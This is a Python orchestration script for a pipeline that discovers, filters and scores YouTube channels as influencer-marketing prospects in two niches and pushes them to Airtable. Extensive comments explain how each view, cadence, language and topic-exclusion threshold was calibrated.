"""
Orchestrates the full channel vetting pipeline, per niche:

  run_discovery() -> pre-filter against that niche's existing Airtable
  channel IDs -> for each remaining candidate: enrich -> score -> push
  to that niche's Airtable table

Run with --test to sanity-check the whole pipeline cheaply (1 keyword,
5 results, first niche only) before spending real quota on a full run.
"""
import argparse
import logging
import math
import re
import sys
import time

# Channel titles can contain characters outside Windows' default console
# codepage (cp1252) — without this, printing one crashes the whole run
# partway through with UnicodeEncodeError.
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

from discovery import run_discovery
from enrichment import (
    get_channel_stats,
    get_recent_video_performance,
    calc_upload_frequency,
    channel_age_months,
    days_since_last_upload,
    scan_older_videos_for_email,
    count_longform_in_older_videos,
)
from scoring import calc_fake_follower_risk, calc_overall_score, QUALIFIED, qualify
from search_zones import (
    country_code,
    description_location_outside_zone,
    region_from_language_tag,
    zone_verdict,
)
from airtable_client import (
    get_existing_channel_ids,
    get_tracked_handles,
    push_record,
    table_has_field,
    AirtableReadError,
    count_added_today,
)
from external_dedupe import fetch_external_handles, ExternalIndex, match_external
from prospect_day import today_iso
from quota_tracker import can_afford_enrichment, get_today_spend
from browser_email import BrowserEmailScraper, null_scraper
from influencers import InfluencersClient, null_client
from influencer_discovery import InfluencerDiscovery
from do_not_contact import BlocklistUnavailable, fetch_blocklist
from config import (
    API_SLEEP_SECONDS,
    DEFAULT_STATUS,
    SOURCE_LABEL,
    DAILY_QUOTA_BUDGET,
    AIRTABLE_TABLE_HOME_THEATER,
    AIRTABLE_TABLE_LIFESTYLE_SOFA,
    CANDIDATE_OVERSHOOT,
    DAILY_FLAGGED_CAP,
    DAILY_QUALIFIED_CAP,
    DISCOVERY_DAYS_BACK,
    EXPECTED_CANDIDATES_PER_KEYWORD,
    INFLUENCERS_MAX_EXCLUDE_HANDLES,
    INFLUENCERS_TEST_DISCOVERY_CREDITS,
    USE_PLAYWRIGHT_STEALTH,
)

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

# The subscriber floor sent to influencers.club's SERVER-SIDE
# `number_of_subscribers` filter, expressed as a FRACTION of the niche's own
# `min_avg_views` rather than an absolute number. Raised from a flat 2,000 on
# 2026-08-14 and wired per-niche below the NICHES dict.
#
# This is the one legitimate use of a vendor statistic in the pipeline: it
# decides which creators we PAY to look at, never what we believe about a
# channel. Every number that gates, scores, or gets written still comes from the
# YouTube Data API v3 (see influencer_discovery._to_candidate).
#
# Why 2,000 was wrong: discovery bills 0.01 per creator returned, and a channel
# has to clear its niche's average AND have 70% of its recent videos over
# MIN_VIEWS_PER_VIDEO to become a row. Against a 10,000 average that made 2,000
# subscribers a 5x view-to-subscriber ratio — rare enough that the old floor
# screened almost nothing out. We paid for those creators and then discarded
# them at the view gate.
#
# Why a RATIO and not an absolute: every other qualification lever here
# (min_avg_views, min_channel_age_months) is per-niche, because the two niches'
# thresholds have already diverged and reconverged once (Lifestyle Sofa's view
# floor was 2,000 before the unification). An absolute subscriber floor would
# silently stop matching the arithmetic that justified it the moment a niche's
# view floor moved, and no test would catch the drift. Deriving it means the
# floor tracks its own niche automatically.
#
# Why 0.5 and not 1.0: the two directions of error are not symmetric. Too high
# is a FALSE NEGATIVE — a real prospect the vendor never shows us, invisible and
# unrecoverable. Too low just costs credits, which the run summary now reports
# per row. A 2x view-to-subscriber ratio is ordinary for an engaged niche
# audience, so a channel with half the view floor in subscribers is a genuine
# prospect and must stay reachable. Tune against the drop-reason counts in a run
# summary, not by intuition.
DISCOVERY_SUBSCRIBER_FLOOR_RATIO = 0.5

# One entry per niche: its search keywords (drawn directly from the
# "Types of Content Posting" > Primary section of each influencer
# profiling brief, Cynthia Lim, updated 15 April 2024 — i.e. actual video
# topics target creators publish, not demographic/psychographic traits,
# those aren't searchable YouTube content) and which Airtable table its
# discovered channels get pushed to. Re-tune keywords as new briefs come
# in or results drift off-niche.
NICHES = {
    "Home Theater": {
        "keywords": [
            "home theater products review",
            "man cave tour",
            "entertainment room makeover",
            "car and truck review",
            "power tools review",
            "sports podcast commentary",
            "movie review and reaction",
            "home theater tech setup",
            "homesteading vlog",
        ],
        "table_name": AIRTABLE_TABLE_HOME_THEATER,
        # Which of the base's EXTERNAL outreach tables belong to this niche,
        # matched case-insensitively as a substring of the source table name in
        # external_dedupe.EXTERNAL_TABLES. Spelled "Theatre" because that is how
        # those tables spell it — the niche key is "Theater", which is exactly
        # why this is an explicit field and not derived from the key.
        #
        # Only used to PRIORITISE the discovery exclude set under the vendor's
        # 10,000-handle cap (see _external_priority); it never changes which
        # candidates are deduped, only which exclusions fit in the request.
        "external_source_hint": "Home Theatre",
        # From the Home Theater brief (Cynthia Lim, 15 April 2024):
        # "Has a Min 10k+ views on YouTube" and "Not a new channel".
        # The 10,000 figure is now the floor BOTH niches run on, so this
        # entry is unchanged by the 2026-08 criteria change — it is the one
        # the other niche moved to. The threshold stays per-niche rather
        # than becoming a shared constant so a niche can be given its own
        # bar again without unpicking the gate.
        "min_avg_views": 10_000,
        "min_channel_age_months": 12,
        # influencers.club discovery filters (the source that replaces
        # search.list when INFLUENCERS_API_KEY is set — see run_niche). The
        # products being promoted are home-theatre gear, so the creators worth
        # reaching are: theatre enthusiasts (home cinema / AV / media rooms),
        # homebodies (people who build their nights-in around home
        # entertainment), and furniture enthusiasts (media-/living-room
        # furnishing). Relevance is carried by the ai_search SEMANTIC query,
        # not by `topics`: the yt-topics taxonomy has no leaf for "home" or
        # "furniture", and pinning topics to Movies/Technology would EXCLUDE
        # the furniture/homebody creators (YouTube files them under Lifestyle).
        # Reword ai_search to steer the niche; it is a 3–150 char free-text
        # field verified live 2026-08-13.
        #
        # gender="male": the primary target for home-theatre products is men.
        # This is the CREATOR's gender, filtered server-side (accepted values
        # verified live: 'any' | 'male' | 'female'). There is also a separate
        # audience.gender filter (target creators whose AUDIENCE skews male) if
        # audience composition ever matters more than the creator's own gender.
        "discovery_filters": {
            "profile_language": ["en"],
            "gender": "male",
            # WIDENED 2026-08-14 after measuring the addressable pool. The old
            # query ("home theater and home cinema setups, media rooms, cozy
            # homebody home entertainment, living room furniture and home
            # furnishing") matched only 444 creators against Lifestyle Sofa's
            # 7,647 — a 17x gap, and the reason this table stopped producing new
            # prospects while the other kept filling. A fixed pool that small is
            # consumed in a few runs, after which exclude_handles leaves almost
            # nothing.
            #
            # Probed one filter at a time (limit=1, so 0.01 credits each) to find
            # what was actually binding. Results, all with gender=male and
            # subs>=5000 held constant:
            #
            #   current wording ......................  444
            #   + projectors / AV receivers / soundbars  445   <- no effect
            #   + man cave / gaming setup / home audio  2623   <- 5.9x
            #   broad "home entertainment" wording      1743
            #
            # The technical AV vocabulary buys nothing; the LIFESTYLE framing is
            # what opens the pool, because home-theatre buyers overlap heavily
            # with man-cave and gaming-setup creators. Gender and the subscriber
            # floor were the other candidates and are much weaker levers
            # (dropping gender entirely: 444 -> 1572; subs 5000 -> 2000: 444 ->
            # 635), so neither was touched — the male-creator preference stands.
            #
            # KEEP THIS UNDER 150 CHARACTERS. The vendor documents 3-150, and a
            # 180-char version measured WORSE (1,039) than this 122-char one,
            # which reads like silent truncation. Re-probe with the snippet above
            # after any reword; do not assume more terms means a wider pool.
            "ai_search": (
                "home theater and home cinema, media room, man cave, gaming setup, "
                "home audio, projector and TV setup, living room furniture"
            ),
            # `number_of_subscribers` is wired in below the NICHES dict, derived
            # from this niche's own min_avg_views via
            # DISCOVERY_SUBSCRIBER_FLOOR_RATIO — see that constant.
            #
            # A server-side "keywords_not_in_description" negation of the
            # off-brand political / ASMR / firearms terms is wired in from
            # EXCLUDED_TOPIC_TERMS after that dict is defined (it lives below
            # this literal) — see EXCLUDED_TOPIC_KEYWORDS.
        },
    },
    "Lifestyle Sofa": {
        "keywords": [
            "interior design and styling",
            "home decor tour",
            "DIY home makeover",
            "day in the life stay at home mom",
            "home cleaning and organizing",
            "furniture review unboxing",
            "cozy living room decor",
            "country living home",
            "minimalist home living",
            "house tour apartment tour",
            "seasonal home decor",
        ],
        "table_name": AIRTABLE_TABLE_LIFESTYLE_SOFA,
        # See the Home Theater entry for what this does. "Lifestyle" matches
        # "Lifestyle – Sofa Influencers" (1,949 handles), which fits under the
        # cap with room to spare — so this niche's external re-bills go to zero.
        "external_source_hint": "Lifestyle",
        # RAISED from the brief's 2,000 to 10,000 in the 2026-08 criteria
        # change, which put both niches on the same view floor. The brief
        # (Cynthia Lim, 15 April 2024) says "Has min of 2k+ view on YouTube
        # videos" — this deliberately overrides it, so don't "restore" the
        # 2,000 from the brief without checking that the instruction to
        # unify the two niches has actually been reversed.
        #
        # The brief sets no channel-age requirement, and that part still
        # stands. Its Instagram thresholds (100k+ followers, 20k+ reel
        # views) are out of scope — this pipeline only observes YouTube.
        "min_avg_views": 10_000,
        "min_channel_age_months": None,
        # Fashion, lifestyle, travel, house tours, and home decor — and
        # especially women-led channels. gender="female" filters the CREATOR
        # server-side (values verified live: 'any' | 'male' | 'female').
        # Relevance rides on ai_search rather than topics: "house tours" and
        # "home decor" have no yt-topics leaf, and pinning topics to the
        # Fashion/Tourism leaves that DO exist would exclude the decor /
        # house-tour creators. Reword ai_search to steer it.
        "discovery_filters": {
            "profile_language": ["en"],
            "gender": "female",
            "ai_search": "fashion and lifestyle vlogs, travel, house tours, home decor and interior styling",
            # As with Home Theater, `number_of_subscribers` is derived from this
            # niche's own min_avg_views below the dict — so if this niche's view
            # floor is ever un-unified back toward the brief's 2,000, its
            # subscriber floor follows automatically instead of going stale.
            #
            # As above: the off-brand "keywords_not_in_description" negation is
            # wired in from EXCLUDED_TOPIC_TERMS below — see
            # EXCLUDED_TOPIC_KEYWORDS.
        },
    },
}

# Outer refill-round cap for the influencers.club discovery loop. discovery
# paginates internally and stops when supply or its credit ceiling runs out;
# this only backstops a pathological run where a very low gate-survival rate
# would otherwise keep asking for more candidates round after round.
DISCOVERY_MAX_ROUNDS = 50

# How many candidates push_until_full will still enrich after the QUALIFIED
# budget is full, hunting for a flagged row, before giving up on the batch.
#
# The asymmetry is the point. Qualification now turns on channel age alone, so a
# flagged row requires an under-12-month channel that also cleared every hard
# gate — uncommon for Home Theater and IMPOSSIBLE for Lifestyle Sofa, whose
# min_channel_age_months is None (qualify() can only ever return "Qualified"
# there). Enrichment costs 3-13 YouTube units per candidate and is charged
# BEFORE qualification is known, so an unbounded hunt spends real quota on rows
# that cannot exist. 10 is generous next to how rarely a flagged row appears,
# and the counter resets whenever one does.
FLAGGED_ONLY_PATIENCE = 10

# Automated topical matching isn't implemented, so every channel is scored
# with the same niche-match value. 70.0 is a deliberate mild-positive prior,
# NOT a neutral midpoint — it asserts that a candidate which came out of a
# niche-targeted discovery query and survived the pre-push gate is somewhat
# more likely than not to fit the brief. (It was 50.0 until 85e9537, which
# raised it without updating this comment; the rows in the live tables were
# all written under 70.0.)
#
# Two consequences before touching this:
#
#   - Because the value is constant, the "Overall Score" carries ZERO
#     brand-fit signal. It ranks channels on size, views, engagement,
#     consistency and trust only. Do not use it to order a human review
#     queue by how on-brand a channel is; it cannot express that, and
#     reviewers have to judge niche fit themselves during Airtable review.
#
#   - Changing the value re-bases every future score. It feeds
#     calc_overall_score() at WEIGHT_NICHE_MATCH = 0.10 (scoring.py), so
#     each point here moves every Overall Score by 0.1 — dropping back to
#     50.0 would put new rows 2 points below the rows already in the live
#     tables and make the two sets incomparable.
#
# Wire in a real niche classifier here if/when one becomes available; that
# is the fix, rather than retuning this constant.
DEFAULT_NICHE_MATCH = 70.0


# One label per step of the chain below. backfill_missing_emails.py
# aggregates these to report which step actually moved email coverage,
# so they must stay distinct.
EMAIL_SOURCE_REPEATED = "repeated across recent videos"
EMAIL_SOURCE_ABOUT = "About description"
EMAIL_SOURCE_OLDER = "repeated across older videos"
EMAIL_SOURCE_INFLUENCERS = "influencers.club enrichment"
EMAIL_SOURCE_BROWSER = "linked site or its /contact page (Playwright)"


# --- Pre-push gate -------------------------------------------------------
# The ONE place this pipeline discards a candidate outright instead of
# flagging it for review. Everything else follows the flag-never-discard
# rule; these cases are exceptions because a human reviewing them is pure
# cost.
#
# The 2026-08 criteria change moved the view floor in here. It used to
# produce a "Below View Minimum" row for a reviewer to dismiss; it is now
# a hard requirement, so an under-view channel is discarded and that
# Qualification value no longer exists (see scoring.py). Two more hard
# requirements landed with it: a minimum video count, and the search-zone
# check below.
#
# Dead channels: both measures have to be dead, not either. In the live
# Home Theater table five rows were burning flagged budget at 0-281 subs
# and 0-38 avg views, while the lowest legitimate Qualified channel sat at
# 2,400 subs / 16,160 views — so 100/100 clears the junk with two orders of
# magnitude to spare. Requiring BOTH keeps a small-but-growing channel
# (few subs, real views) and a fading big one (many subs, few views) in the
# table where a reviewer can see them.
#
# That gate is now mostly redundant against a 10,000-view floor, and is
# kept anyway: it is the floor that holds if a niche's own min_avg_views is
# ever lowered, and it is the only one of the two that reads subscribers.
JUNK_MIN_SUBSCRIBERS = 100
JUNK_MIN_AVG_VIEWS = 100

# A published track record, applied to BOTH niches. Read from
# channels.list statistics.videoCount, i.e. the channel's whole public
# catalogue, not the 10-video performance window or the 50-video email
# scan. Deliberately a FLOOR with no upper bound: "30-40 videos" describes
# the smallest catalogue worth approaching, and a channel with 400 uploads
# clears that bar rather than failing it.
MIN_VIDEO_COUNT = 30

# The same 30-video floor, but counting only videos confirmed NOT to be
# Shorts. MIN_VIDEO_COUNT above reads statistics.videoCount, which lumps
# Shorts in with everything else — so a channel with 300 Shorts and 4
# long-form uploads cleared it, which is not what "30-40 videos minimum"
# means for a brand looking to place a product in real content.
#
# is_shorts_only() does NOT cover this: it discards only channels that are
# 100% Shorts, so the entire middle ground (a Shorts factory that posts the
# occasional long-form video) passed both checks. Measured on 47 otherwise-
# qualifying Home Theater candidates, 12 had fewer than 10 long-form videos
# in their newest 50 and were being written as prospects.
#
# Confirmed against up to ~200 videos — the newest 50 from enrichment plus
# LONGFORM_SCAN_MAX_PAGES more — see enrichment.count_longform_in_older_videos.
MIN_LONGFORM_VIDEO_COUNT = 30

# Content language must be English. The tag is the channel's own
# defaultAudioLanguage/defaultLanguage, reduced to the most common value
# across the sampled videos by enrichment.dominant_language().
#
# Matched on the "en" PREFIX, so en, en-US, en-GB and en-AU all pass: the
# region subtag is not noise to be normalised away — main.resolve_country()
# reads it to place channels that declare no country, which is the only
# search-zone signal available for ~15% of candidates. Stripping it to a bare
# "en" would silently blind the zone filter for exactly those channels.
ENGLISH_LANGUAGE_PREFIX = "en"

# Character ranges that mean a channel description is written in a language
# other than English. Checked because is_english() above reads only the
# per-video language TAG, and a creator can tag uploads "en" while writing their
# channel bio in another language entirely — @LINTAN777 (2026-08-14) declared
# country US, tagged its videos "en", cleared every numeric gate, and had a bio
# 24% Chinese. The tag said English; the channel did not read as one.
#
# Scripts, not "non-ASCII". Emoji, box-drawing, arrows, currency symbols and
# accented Latin (é, ü, ñ) are all deliberately ABSENT: an English channel
# routinely uses those, and matching them would drop good prospects on
# decoration. Only ranges that carry actual language are listed.
NON_LATIN_SCRIPT_RANGES = (
    (0x0400, 0x04FF),   # Cyrillic
    (0x0590, 0x05FF),   # Hebrew
    (0x0600, 0x06FF),   # Arabic
    (0x0700, 0x074F),   # Syriac
    (0x0900, 0x097F),   # Devanagari
    (0x0980, 0x09FF),   # Bengali
    (0x0B80, 0x0BFF),   # Tamil
    (0x0E00, 0x0E7F),   # Thai
    (0x3040, 0x30FF),   # Hiragana + Katakana
    (0x3400, 0x4DBF),   # CJK Unified Ideographs Extension A
    (0x4E00, 0x9FFF),   # CJK Unified Ideographs
    (0xA000, 0xA4CF),   # Yi
    (0xAC00, 0xD7AF),   # Hangul syllables
    (0xF900, 0xFAFF),   # CJK compatibility ideographs
)

# Two thresholds, and both are needed. The RATIO catches a genuinely
# non-English bio (@LINTAN777 measured 24%). The absolute FLOOR stops a short
# bio tripping on decoration — "new video 日曜日!" is 2 CJK characters in a
# 20-character string, which is 10% by ratio but obviously not a language
# signal. A bilingual bio with a real paragraph in another language clears both.
MAX_NON_LATIN_DESCRIPTION_RATIO = 0.10
MIN_NON_LATIN_DESCRIPTION_CHARS = 8

# The per-video view floor, applied to BOTH niches. This is the per-video
# reading of "min 10k+ views" — stricter than the niche's min_avg_views floor,
# which one strong upload can carry over the line while other recent videos
# flopped. Kept alongside min_avg_views, not replacing it, so a niche can still
# be given its own average bar.
MIN_VIEWS_PER_VIDEO = 10_000

# ...but only MIN_VIEWS_PER_VIDEO_RATIO of the sampled LONG-FORM videos has to
# clear it, not all of them (changed 2026-08-14, at the user's direction, and
# applied to BOTH niches — Lifestyle Sofa included; its brief's 2,000 figure
# stays overridden). Shorts are excluded from the sample entirely; see
# enrichment.get_recent_video_performance.
#
# CALIBRATED against the live tables, not guessed. Re-checking all 80 tracked
# rows put the two groups here:
#
#   - Shorts-inflated channels scored 0-3 of 10 (Explore With Jasir 0/10 on a
#     140,885 average, Diva Angel 2/9, Kat and Sourabh 3/10).
#   - Channels a HUMAN REVIEWER had already marked Approved scored 5-6 of 10
#     (ETPC 6/10 at 22,198 avg, Bane Tech 5/10 at 23,914 avg).
#
# The bar has to sit in the gap between 3 and 5, and it must ADMIT 5 — a gate
# that rejects channels the reviewers themselves approved is miscalibrated by
# definition. 0.70 failed that (it rejected both). 0.60 failed it too, and less
# obviously: ceil(0.60 x 10) = 6 admits ETPC and still rejects Bane Tech by one
# video, so the stated goal of "let the reviewers' band through" was only half
# met. That is the trap in a ratio — the effective bar is the CEIL, not the
# percentage, and at n=10 a 0.60 and a 0.51 are five percentage points apart on
# paper and one whole video apart in practice.
#
# 0.50 is the first value that admits the whole approved band (ceil = 5) while
# still excluding every Shorts-inflated channel measured, the best of which
# managed 3. If this is retuned again, do it the same way — run
# audit_prospects.py and look at where the reviewers' own Approved/Rejected
# calls actually fall, then check the CEIL at the sample sizes you actually see.
#
# Why this changed. The gate used to test the window's MINIMUM, i.e. "EVERY
# recent video passed 10k". Read against the 10,000 AVERAGE floor next to it,
# that is far harsher than it looks: for a channel averaging 10k, roughly half
# its videos sit below the average, so its weakest recent upload almost
# certainly misses 10k and the channel is discarded. The effective bar was not
# "10,000 average" but something nearer a 25,000-50,000 average — well past
# anything the brief asked for, and the most plausible single cause of the ~1%
# discovery survival rate measured on 2026-08-13 (~97 creators examined for one
# qualified row).
#
# The ratio keeps what the floor was actually for — catching a channel whose
# average is propped up by one viral upload while the rest flopped — without
# demanding every upload be a hit. At the default PERFORMANCE_SAMPLE_SIZE of 10
# that is "at least 6 of the newest 10 long-form videos".
#
# The denominator is the count of SETTLED, REPORTED videos, not a flat 10: an
# upload still climbing toward 10k, or one with no public view count, is unknown
# rather than failing, and enrichment already excludes both from
# `settled_views`. So the rule reads "50% of the videos we can actually judge".
MIN_VIEWS_PER_VIDEO_RATIO = 0.50

# ...and below this many judgeable videos the ratio is SKIPPED, not applied.
#
# A floating denominator makes the gate meaningful at n=10 and arbitrary at
# n=3, because the ceil quantises hardest exactly where the sample is thinnest.
# Two live rows showed it: Kaitlyn :) at 1 of 3 needed 2 (a single upload
# decides the channel) and Adrianne MG at 2 of 7 needed 4. Neither number
# describes a channel — they describe a sample too small to describe one.
#
# So this follows the same rule as an unknown country, an unknown age and an
# unreported video_count: absent data is not evidence against the channel, and
# "we could only judge 3 videos" is absent data. A skipped ratio is not a free
# pass — min_avg_views, the 30-video floor, the 30-long-form floor, the cadence
# floor and the staleness check all still apply.
#
# 5 is the smallest sample where the ceil lands somewhere sane: at n=5 the bar
# is 3 of 5, which is a real majority, while at n=4 it is 2 of 4 — a coin flip
# dressed up as a criterion. It does NOT rescue Adrianne MG (7 judgeable videos
# is enough to judge, and 2 of 7 fails); it does leave Kaitlyn :) unjudged by
# this particular gate, which is the correct reading of 3 videos.
#
# Note this can only ever fire for a channel that ALREADY cleared the 30
# long-form floor — so it means "their recent long-form is mostly too new to
# score", not "they barely post long-form".
MIN_SETTLED_SAMPLE_FOR_RATIO = 5

# A live channel, applied to BOTH niches: at least this many uploads per year,
# read from the sampled window's cadence (enrichment.calc_upload_frequency,
# videos/month, annualised). Unknown cadence (fewer than two sampled uploads) is
# passed as None and never disqualifies, the same rule as an unknown age.
#
# LOWERED from 10 to 6 (2026-08-14). The audit of all 80 tracked rows turned up
# two channels this gate was the ONLY thing rejecting, both strong on every
# other measure: Ashley Devonna (94,750 long-form average, 10 of 10 recent
# videos over 10k) and Karin Bohn (19,530 average, 7 of 10). A rule whose only
# observed effect is discarding the best channel in the sample is worth
# doubting, and MAX_DAYS_SINCE_LAST_UPLOAD below is the gate that actually
# catches an abandoned channel.
#
# BUT 6 DOES NOT RESCUE EITHER OF THEM, and the reason is worth recording rather
# than re-deriving. Ashley Devonna's newest TEN uploads span 2022-06 to 2026-08
# — 2.4 uploads a year. The channel has 259 videos, so it was prolific once and
# has nearly stopped; it posted 4 days ago, so it is not dormant either. It is a
# genuinely low-cadence channel, not the "monthly creator" this comment first
# claimed. Keeping it would mean a floor near 2, which is the same as deleting
# the gate.
#
# So 6 is a compromise held on purpose: it stops the floor rejecting an ordinary
# every-six-weeks creator (~9/yr), while still excluding channels that publish
# two or three times a year. Whether a 2-3/yr channel with a 94k average is
# worth contacting is a business call about placement frequency, not something
# this file can settle — it is flagged to the user rather than decided here.
#
# CAVEAT: MIN_VIEWS_PER_VIDEO_RATIO was calibrated against 80 rows with reviewer
# verdicts to check against. This is 2 data points. Revisit once a few audits
# have produced a real cadence distribution.
MIN_UPLOADS_PER_YEAR = 6

# Still-active: the most recent sampled upload must be within this many days
# (a rolling ~12 months from today, NOT the calendar year). A channel that
# went quiet a year ago is not one to approach, however strong its back
# catalogue. An unknown last-upload date (nothing parseable in the window) is
# passed as None and never disqualifies.
MAX_DAYS_SINCE_LAST_UPLOAD = 365

DROP_DEAD_CHANNEL = "dead_channel"
DROP_SHORTS_ONLY = "shorts_only"
DROP_BELOW_VIEW_MINIMUM = "below_view_minimum"
DROP_VIDEO_BELOW_VIEW_MINIMUM = "video_below_view_minimum"
DROP_TOO_FEW_VIDEOS = "too_few_videos"
DROP_TOO_FEW_LONGFORM = "too_few_longform_videos"
DROP_NOT_ENGLISH = "not_english"
DROP_OUTSIDE_SEARCH_ZONE = "outside_search_zone"
DROP_EXCLUDED_TOPIC = "excluded_topic"
DROP_UPLOAD_CADENCE_TOO_LOW = "upload_cadence_too_low"
DROP_STALE_CHANNEL = "stale_channel"
DROP_NO_SOCIAL = "no_social_presence"
# Not a judgement on the channel: the run ran out of YouTube quota before it
# could look. Named distinctly from the other drop reasons so a run summary
# showing these is read as "come back tomorrow", not "these channels failed".
DROP_QUOTA_EXHAUSTED = "quota_exhausted"
# The channel's own bio isn't in English, whatever its video language tag says.
# Distinct from DROP_NOT_ENGLISH so a run summary shows which signal fired —
# they disagree in exactly the case this gate was added for.
DROP_NON_ENGLISH_DESCRIPTION = "non_english_description"

# Whole categories a brand-partnership run must never surface, however well a
# channel otherwise fits a niche: political commentary, ASMR, and firearms /
# gun-review content. Discarded outright like the gates above (not flagged) —
# the brief rules them out, so a human reviewing them is pure cost.
#
# Matched as WHOLE WORDS (case-insensitive) against the channel's OWN title
# and About description only — its self-identification — never its video
# descriptions, which would drag in false positives (a home-theater channel
# reviewing a war film; a decor channel styling a "campaign" desk).
#
# The term lists are deliberately tuned against THIS pipeline's two niches,
# where the obvious words are landmines:
#   - firearms omits bare "gun"/"shotgun"/"shooting" ("nail/glue/spray gun"
#     are DIY/furniture vocabulary; "shotgun" is a home-theater MICROPHONE),
#     AND omits "pistol"/"revolver"/"rifle": Home Theater is audiophile-
#     adjacent and Lifestyle Sofa covers fashion/thrift, so those collide
#     with the Sex Pistols, the Beatles' "Revolver", and the verb "rifle
#     through". The remaining firearm-specific terms still catch a gun-review
#     channel, which will carry firearm/handgun/ammo/AR-15/glock/etc.
#   - political omits "conservative"/"liberal" (everyday decor/design
#     adjectives: "a conservative palette", "liberal use of throw pillows")
#     and "parliament" (the funk band Parliament-Funkadelic).
# Over-excluding costs one lead; under-excluding lets a banned category
# through. Tune the sets if a real prospect is ever wrongly dropped.
EXCLUDED_TOPIC_TERMS = {
    "political": [
        "politics", "political", "geopolitics", "election", "elections",
        "democrat", "democrats", "republican", "republicans", "libertarian",
        "leftist", "left-wing", "right-wing", "congress", "senate",
        "communism", "socialism", "MAGA",
    ],
    "asmr": ["asmr", "tingles", "mouth sounds"],
    "firearms": [
        "firearm", "firearms", "handgun", "handguns", "ammo", "ammunition",
        "AR-15", "AK-47", "glock", "concealed carry", "second amendment",
        "gunsmith", "ballistics",
    ],
    # --- WRONG VERTICAL (2026-08-15) -------------------------------------
    # Added after two channels reached the Home Theater table that no gate
    # could have stopped, because no gate asks about RELEVANCE: fit is
    # delegated entirely to influencers.club's ai_search, which was widened
    # 5.9x on 2026-08-14 for pool size and never re-checked for precision.
    #
    # This is a BLOCKLIST, and it is honestly whack-a-mole — it catches the
    # verticals named here and nothing else. A general relevance gate was
    # built and MEASURED first, and rejected on the numbers:
    #
    #   - On BIOS: unusable. Four tracked channels have no vocabulary at all
    #     ("Hi!", "Collab: <email>", a bare email address), so a
    #     must-match-a-term rule discards real prospects on an empty bio.
    #   - On the 50 VIDEO TITLES (free — already fetched for the duplicate
    #     filter): better, but it does not separate the two groups. Measured
    #     over all 38 Home Theater rows, the racing channel scored 2/50 and
    #     WOULD have been caught, but the logging channel scored 25/50 (its
    #     titles carry "furniture", "home decor", "interior" from woodworking)
    #     and would NOT, while "Jasper Tran - House Design Ideas" scored 0/50
    #     and a real prospect would have been discarded. A threshold that
    #     catches one of the two reported channels costs two false positives
    #     and still misses the other.
    #
    # Both channels ARE caught cleanly by their own bios, which is what these
    # terms read. Terms are kept narrow on purpose — each one also goes to the
    # vendor as keywords_not_in_description, so a sloppy term silently shrinks
    # the discovery pool as well as dropping rows.
    "sim_racing": [
        # Game TITLES, not "racing": "car and truck review" is a deliberate
        # Home Theater keyword, and a creator who builds a sim rig in their
        # man cave is a legitimate prospect. What is off-niche is gameplay
        # content, and a gameplay channel names the games in its bio.
        "beamng", "assetto corsa", "iracing", "gran turismo",
    ],
    "forestry": [
        # "logging truck" and not bare "logging": the word-boundary match
        # already spares "vlogging", but "logging" alone would still fire on
        # "logging my progress". "timber"/"chainsaw" are deliberately OMITTED
        # — "timber furniture" is ordinary AU/UK furniture vocabulary for
        # Lifestyle Sofa, and "power tools review" is a Home Theater keyword.
        "logging truck", "logging trucks", "forestry", "sawmill",
        "tree felling",
    ],
}

# The same off-brand terms, flattened for influencers.club discovery's
# SERVER-SIDE negation filter (see the wiring loop below). Sent as the
# vendor's `keywords_not_in_description`, which withholds any creator whose
# profile bio carries one of these words/phrases — so the whole political /
# ASMR / firearms categories are never RETURNED, and (at 0.01 credits per
# returned creator) never BILLED. This is the credit-saving move
# exclude_handles already makes for already-known creators: filtering these
# out locally after the response, the way excluded_topic_reason() does, cannot
# refund the discovery credit the vendor has already charged.
#
# Reuses EXCLUDED_TOPIC_TERMS verbatim rather than a hand-kept copy, so the
# server pre-filter and the local backstop can never drift. Safe to reuse
# because the vendor field matches the SAME way the local gate does — case-
# insensitive, on whole words and multi-word phrases (verified live
# 2026-08-14, the way gender's accepted values were: a wrong-type probe
# names the field, and keywords_in/keywords_not partition the result set
# exactly — P + N == base total). So the landmine words that gate deliberately
# omits ("gun"/"rifle"/"conservative"/…) stay omitted here too; "MAGA" does
# not match "magazine".
EXCLUDED_TOPIC_KEYWORDS = sorted(
    {term for terms in EXCLUDED_TOPIC_TERMS.values() for term in terms}
)

def wire_discovery_filters(niches: dict) -> None:
    """
    Fill in the server-side discovery filters that can't be written inline in
    the NICHES literal, because they derive from things defined after it.

    Called at import, immediately below. A named function rather than a
    top-level for-loop for two reasons: a test can hand it a deliberately
    misconfigured niche (a bare loop here could only be exercised by
    re-importing the module), and it needs no `del` of throwaway loop names
    afterwards.

    Mutates `niches` in place. Every lookup is guarded with `in` rather than
    indexed, and that is load-bearing rather than defensive noise: this runs
    while `import main` is still executing, so a KeyError here kills the run
    before logging is configured, before the blocklist fetch, before any niche
    is attempted. That is strictly worse than the failure this project
    deliberately designed for, where run_niche() checks the same keys against
    REQUIRED_NICHE_KEYS and skips only the offending niche with a logged error.
    Leaving a filter unset routes a misconfigured niche back to that check.
    """
    for niche_config in niches.values():
        filters = niche_config.get("discovery_filters")
        if filters is None:
            continue  # search.list-only niche; nothing to wire

        # A per-niche list() copy, not the shared constant itself: each niche
        # owns its own list, so a future per-niche exclusion edit can't mutate
        # the other niche's filter (or EXCLUDED_TOPIC_KEYWORDS) in place. The
        # copies are still all derived from EXCLUDED_TOPIC_TERMS at import, so
        # the no-drift guarantee above is unaffected.
        filters["keywords_not_in_description"] = list(EXCLUDED_TOPIC_KEYWORDS)

        # The subscriber floor, derived from THIS niche's own view floor so the
        # two can never drift apart — see DISCOVERY_SUBSCRIBER_FLOOR_RATIO.
        # int(), because the vendor's number_of_subscribers.min is an integer
        # field and a float would be a type error at the API rather than here.
        if "min_avg_views" in niche_config:
            filters["number_of_subscribers"] = {
                "min": int(niche_config["min_avg_views"] * DISCOVERY_SUBSCRIBER_FLOOR_RATIO)
            }


# The local excluded_topic_reason() gate in process_candidate STAYS as the
# deterministic backstop to the keywords_not_in_description filter wired above:
# it also reads the channel TITLE (not just the bio), and it is the only tier
# that covers the search.list fallback path the server-side filter never sees.
wire_discovery_filters(NICHES)


# One pattern per category, matching any listed term on a word boundary.
# Compiled once at import, not per candidate.
_EXCLUDED_TOPIC_PATTERNS = {
    category: re.compile(
        r"\b(?:" + "|".join(re.escape(term) for term in terms) + r")\b",
        re.IGNORECASE,
    )
    for category, terms in EXCLUDED_TOPIC_TERMS.items()
}


